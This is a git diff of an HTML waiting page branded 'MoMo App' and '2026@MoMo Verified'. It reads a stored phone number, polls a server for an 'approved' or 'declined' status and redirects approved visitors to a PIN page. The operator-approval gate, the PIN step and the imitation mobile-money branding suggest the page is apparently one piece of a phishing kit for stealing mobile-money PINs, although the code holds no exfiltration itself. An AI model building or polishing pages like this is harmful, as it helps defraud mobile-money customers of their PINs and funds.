@@ -1,57 +1,107 @@
 <!DOCTYPE html>
 <html>
 <head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Processing</title>
+
 <style>
 body {
-  background:#0b5c6b;
-  color:white;
-  text-align:center;
-  font-family:Arial;
-  margin-top:100px;
+  margin: 0;
+  font-family: Arial, sans-serif;
+  background: #0b5c6b;
+  color: white;
+  text-align: center;
+}
+
+.header {
+  padding: 20px;
+  font-size: 20px;
+  font-weight: bold;
+  color: #ffcc00;
+}
+
+.container {
+  margin-top: 80px;
+}
+
+.loader {
+  margin-top: 20px;
+  font-size: 14px;
+}
+
+.footer {
+  position: fixed;
+  bottom: 10px;
+  width: 100%;
+  font-size: 12px;
 }
 </style>
 </head>
 
 <body>
 
-<h2>⏳ Processing your request...</h2>
-<p>Please wait for approval</p>
+<div class="header">
+  MoMo App
+</div>
+
+<div class="container">
+  <h2 id="statusText">⏳ Processing your request...</h2>
+  <div class="loader">Please wait for approval</div>
+</div>
+
+<div class="footer">
+  2026@MoMo Verified
+</div>
 
 <script>
 const phone = localStorage.getItem("phone");
 
+// If no phone, go back
 if (!phone) {
-  document.body.innerHTML = "<h2>❌ Error: Phone not found. Please restart application.</h2>";
+  window.location.href = "/";
 }
 
+// CHECK STATUS FUNCTION
 async function checkStatus() {
   try {
     const res = await fetch("/status/" + phone);
-    
-    if (!res.ok) {
-      console.log("Server error");
-      return;
-    }
-
     const data = await res.json();
-    console.log("STATUS:", data);
 
-    if (data.status === "approved") {
-      window.location.href = "/pin.html";
+    // WAITING
+    if (data.status === "pending") {
+      document.getElementById("statusText").innerText = "⏳ Waiting for approval...";
     }
 
-    if (data.status === "declined") {
-      document.body.innerHTML = "<h2>❌ Request Declined</h2>";
-      clearInterval(timer);
+    // APPROVED → GO TO PIN
+    else if (data.status === "approved") {
+      document.getElementById("statusText").innerText = "✅ Approved! Redirecting...";
+      
+      setTimeout(() => {
+        window.location.href = "/pin.html";
+      }, 1500);
+    }
+
+    // DECLINED
+    else if (data.status === "declined") {
+      document.getElementById("statusText").innerText = "❌ Application Declined";
+    }
+
+    // UNKNOWN
+    else {
+      document.getElementById("statusText").innerText = "⚠️ Session expired. Restart.";
     }
 
   } catch (err) {
-    console.log("Network error:", err);
+    document.getElementById("statusText").innerText = "⚠️ Network error...";
   }
 }
 
-const timer = setInterval(checkStatus, 3000);
+// RUN EVERY 3 SECONDS
+setInterval(checkStatus, 3000);
+
+// RUN IMMEDIATELY
+checkStatus();
 </script>
 
 </body>
